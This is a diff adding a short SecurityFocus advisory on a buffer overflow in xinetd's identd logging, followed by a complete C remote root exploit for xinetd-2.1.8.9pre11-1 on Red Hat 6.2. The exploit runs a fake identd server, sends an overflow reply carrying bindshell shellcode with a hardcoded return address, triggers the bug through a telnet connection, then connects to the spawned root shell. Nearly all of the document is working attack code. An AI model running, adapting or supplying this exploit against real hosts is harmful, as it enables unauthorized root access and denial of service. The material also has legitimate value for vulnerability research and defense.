@@ -1,0 +1,369 @@
+source: http://www.securityfocus.com/bid/2840/info
+
+The possibility for a buffer overflow condition exists in the xinetd daemon.
+
+Xinetd provides the ability to log via identd the user-identities of clients connecting to specific services if the clients host supports it.
+
+It may be possible for attackers to construct identd responses which exploit this subtle overflow condition.
+
+If successfully exploited, an attacker would gain root privileges on the affected host. It may also be possible for attackers to crash xinetd, which would result in a denial of service for all services started by inetd (telnet, ftp, etc). 
+
+/*
+ * xinetd-2.1.8.9pre11-1 Linux x86 remote root exploit
+ * by qitest1 28/06/2001
+ *
+ * This is a proof of concept code for the exploitation of the bof
+ * present in xinetd-2.1.8.9pre11-1. Read the advisories first. The
+ * code uses a single-byte corruption of the fp, as explained by klog.
+ * sc_addr_pos is the position, from the beginning of the writable
+ * area, where a pointer to the nop will be placed.
+ *
+ * For ethical reasons just one hardcoded target type will be provided. 
+ * Its values work only against one of the bugged 'pre' releases of 
+ * xinetd, installed on my Red Hat 6.2 box. Not for kiddies.
+ *
+ * Greets: zen-parse, for having found this bug
+ *	   klog, for his paper about the fp corruption
+ *	   all my friends on the internet =)
+ *
+ * 100% pure 0x69. =)   
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+#define MY_PORT         1
+#define THEIR_PORT      23 
+#define IDENTD_PORT     113
+#define FIRST_PAD       1009
+
+  struct targ
+    {
+      int                  def;
+      char                 *descr;
+      unsigned long int    retaddr;
+      int		   sc_addr_pos;
+    };
+
+  struct targ target[]=
+    {                   
+      {0, "Red Hat 6.2 with xinetd-2.1.8.9pre11-1", 0xbffff44b, 985},
+      {69, NULL, 0}
+    };
+
+  char shellcode[] = /* Taeho Oh bindshell code at port 30464 */
+  "\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
+  "\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
+  "\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
+  "\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
+  "\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
+  "\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
+  "\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
+  "\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
+  "\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
+  "\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
+  "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
+  "\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";
+
+  char   zbuf[1024], host[512];
+  int	 sel = 0, offset = 0;
+
+  int    sockami2(char *host, int my_port, int their_port);
+  void   fake_identd(void);
+  void   l33t_buf(void);
+  static void keep_clz(void) __attribute__ ((destructor));
+  void 	 shellami(int sock);
+  void   usage(char *progname);
+
+int
+main(int argc, char **argv)
+{
+  int	sock, cnt;
+
+  printf("\n  xinetd-2.1.8.9pre11-1 exploit by qitest1\n\n");
+  
+  if(getuid())
+        {
+          fprintf(stderr, "Must be root babe\n");
+          exit(1);
+        }
+
+  if(argc == 1)
+        usage(argv[0]);
+  host[0] = 0;
+  while((cnt = getopt(argc,argv,"h:t:o:s:")) != EOF)
+    {
+   switch(cnt)
+        {
+   case 'h':
+     strncpy(host, optarg, sizeof(host));
+     host[sizeof(host)] = '\x00';
+     break;
+   case 't':
+     sel = atoi(optarg);       
+     break;
+   case 'o':
+     offset = atoi(optarg);
+     break;
+   case 's':
+     target[sel].sc_addr_pos = atoi(optarg);
+     break;
+   default:
+     usage(argv[0]);
+     break;
+        }
+    }
+  if(host[0] == 0)
+        usage(argv[0]);
+
+  printf("+Host: %s\n  as: %s\n", host, target[sel].descr);
+  target[sel].retaddr += offset;
+  printf("+Using: retaddr = %p and sc_addr_pos = %d...\n  ok\n",
+  target[sel].retaddr, target[sel].sc_addr_pos);
+  printf("+Starting fake_identd...\n");
+  fake_identd();
+  return;
+}
+
+int
+sockami2(char *host, int my_port, int their_port)
+{
+  struct        sockaddr_in address;
+  struct        sockaddr_in my_addr;
+  struct        hostent *hp;
+  int           sock;
+
+  sock = socket(AF_INET, SOCK_STREAM, 0);
+  if(sock == -1)
+        {
+          perror("socket()");
+          exit(-1);
+        }
+ 
+  hp = gethostbyname(host);
+  if(hp == NULL)
+        {
+          perror("gethostbyname()");
+          exit(-1);
+        }
+
+  my_addr.sin_family = AF_INET;
+  my_addr.sin_port = htons(my_port);
+  my_addr.sin_addr.s_addr = INADDR_ANY;
+  bzero(&(my_addr.sin_zero), 8);
+
+  if(bind(sock, (struct sockaddr *)&my_addr,
+  sizeof(struct sockaddr)) == -1)
+        {
+          perror("bind()");
+          exit(1);
+        }
+
+  memset(&address, 0, sizeof(address));
+  memcpy((char *) &address.sin_addr, hp->h_addr, hp->h_length);
+  address.sin_family = AF_INET;
+  address.sin_port = htons(their_port);
+
+  if(connect(sock, (struct sockaddr *) &address, 
+  sizeof(address)) == -1)
+        {
+          perror("connect()");
+          exit(-1);
+        }
+
+  return(sock);
+}
+
+void
+fake_identd(void)
+{
+  int           sockfd, new_fd, sin_size, rem_port, loc_port, i;
+  char          rbuf[1024], sbuf[1024], cif[6], *ptr;
+  struct        sockaddr_in my_addr;   
+  struct        sockaddr_in their_addr;        
+
+  printf("  fake_identd forking into background\n");
+  if (!fork())
+    {
+        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
+          {
+            perror("socket()");
+            exit(1);
+          }
+        
+        my_addr.sin_family = AF_INET;         
+        my_addr.sin_port = htons(IDENTD_PORT);     
+        my_addr.sin_addr.s_addr = INADDR_ANY; 
+        bzero(&(my_addr.sin_zero), 8);        
+
+        if(bind(sockfd, (struct sockaddr *)&my_addr, 
+        sizeof(struct sockaddr)) == -1) 
+          {
+            perror("bind()");
+            exit(1);
+          }
+
+        if(listen(sockfd, 1) == -1)
+          {
+            perror("listen()");
+            exit(1);
+          }
+
+        while(1)
+          {  
+            sin_size = sizeof(struct sockaddr_in);
+            if((new_fd = accept(sockfd, (struct sockaddr *)&their_addr, 
+            &sin_size)) == -1) 
+              {
+                perror("accept()");
+                continue;
+              }
+
+        /* Fake session 
+         */
+            memset(rbuf, 0, sizeof(rbuf));
+            recv(new_fd, rbuf, sizeof(rbuf), 0);
+
+        /* Parsing of query
+         */
+            ptr = rbuf; i = 0;
+            while(*ptr != ',')
+              {
+                cif[i] = *ptr;
+                *ptr++; i ++;
+              }
+            sscanf(cif, "%d", &rem_port); 
+            memset(cif, 0, sizeof(cif));
+            *ptr++; i = 0;
+            while(*ptr != ' ')
+              {
+                cif[i] = *ptr;
+                *ptr++; i++;
+              }
+            sscanf(cif, "%d", &loc_port); 
+        
+            l33t_buf();
+        
+            memset(sbuf, 0, sizeof(sbuf));
+            sprintf(sbuf, "%d,%d:USERID:%s\r\n", 
+            rem_port, loc_port, zbuf);
+            send(new_fd, sbuf, strlen(sbuf), 0);
+
+            memset(rbuf, 0, sizeof(rbuf));
+            recv(new_fd, rbuf, sizeof(rbuf), 0);
+
+        /* End
+         */
+          }
+    }
+  return;
+}
+
+void
+l33t_buf(void)
+{
+  int           i, n = 0;
+
+  memset(zbuf, 0, sizeof(zbuf));
+  for(i = 0; i < FIRST_PAD; i++)
+        zbuf[i] = '\x69';
+
+  memset(zbuf, 0x90, target[sel].sc_addr_pos - 1);
+  for(i = target[sel].sc_addr_pos - strlen(shellcode); 
+      i < target[sel].sc_addr_pos; 
+      i++)
+        zbuf[i] = shellcode[n++];
+  
+  zbuf[target[sel].sc_addr_pos + 0] = 
+	(u_char) (target[sel].retaddr & 0x000000ff);
+  zbuf[target[sel].sc_addr_pos + 1] = 
+	(u_char)((target[sel].retaddr & 0x0000ff00) >> 8);
+  zbuf[target[sel].sc_addr_pos + 2] = 
+	(u_char)((target[sel].retaddr & 0x00ff0000) >> 16);
+  zbuf[target[sel].sc_addr_pos + 3] = 
+	(u_char)((target[sel].retaddr & 0xff000000) >> 24);
+
+  return;
+}
+
+void
+keep_clz(void)
+{
+  int	sock;
+
+  if(host[0] != 0)
+	{
+	  printf("+Causing an auth request to our fake_identd\n");
+  	  sock = sockami2(host, MY_PORT, THEIR_PORT); 
+  	  printf("  done\n");
+  	  close(sock);
+
+	  printf("+Enjoy your root shell...\n  0x69 =)\n");
+	  sleep(1);
+	  sock = sockami2(host, 6969, 30464);
+	  shellami(sock);
+	}
+}
+
+void
+shellami(int sock)
+{
+  int             n;
+  char            recvbuf[1024], *cmd = "id; uname -a\n";
+  fd_set          rset;
+
+  send(sock, cmd, strlen(cmd), 0);
+
+  while (1)
+    {
+      FD_ZERO(&rset);
+      FD_SET(sock, &rset);
+      FD_SET(STDIN_FILENO, &rset);
+      select(sock+1, &rset, NULL, NULL, NULL);
+      if(FD_ISSET(sock, &rset))
+        {
+          n = read(sock, recvbuf, 1024);
+          if (n <= 0)
+            {
+              printf("Connection closed by foreign host.\n");
+              exit(0);
+            }
+          recvbuf[n] = 0;
+          printf("%s", recvbuf);
+        }
+      if (FD_ISSET(STDIN_FILENO, &rset))
+        {
+          n = read(STDIN_FILENO, recvbuf, 1024);
+          if (n > 0)
+            {
+              recvbuf[n] = 0;
+              write(sock, recvbuf, n);
+            }
+        }
+    }
+  return;
+}
+
+void
+usage(char *progname)
+{
+  int  i = 0;
+  
+  printf("Usage: %s [options]\n", progname);
+  printf("Options:\n"
+         "  -h hostname\n"
+         "  -t target\n"
+         "  -o offset\n"
+	 "  -s sc_addr_pos\n"
+         "Available targets:\n");
+  while(target[i].def != 69)
+        { 
+          printf("  %d) %s\n", target[i].def, target[i].descr);
+          i++;
+        } 
+
+  exit(1);
+}
